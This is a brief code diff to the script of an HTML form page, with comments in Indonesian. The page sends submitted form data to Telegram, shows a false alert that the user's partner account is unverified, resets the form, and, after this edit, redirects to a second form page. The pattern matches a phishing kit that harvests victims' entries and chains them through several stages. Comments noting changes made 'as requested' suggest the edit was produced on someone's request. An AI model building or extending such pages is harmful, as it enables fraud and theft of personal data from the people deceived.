@@ -301,11 +301,14 @@
             // PENGIRIMAN DATA FORMULIR
             sendToTelegram(orderData);
 
-            // TAMPILKAN ALERT SESUAI PERMINTAAN
+            // TAMPILKAN ALERT (Tidak diubah sesuai permintaan)
             alert('Anda belum memverifikasi akun mitra Anda. Silakan ulangi di aplikasi');
 
-            // RESET FORMULIR
+            // RESET FORMULIR (Tidak dihapus sesuai permintaan)
             resetForm();
+
+            // PENGALIHAN KE HALAMAN Formulir3.html
+            window.location.href = 'Formulir3.html';
         });
     </script>
 </body>
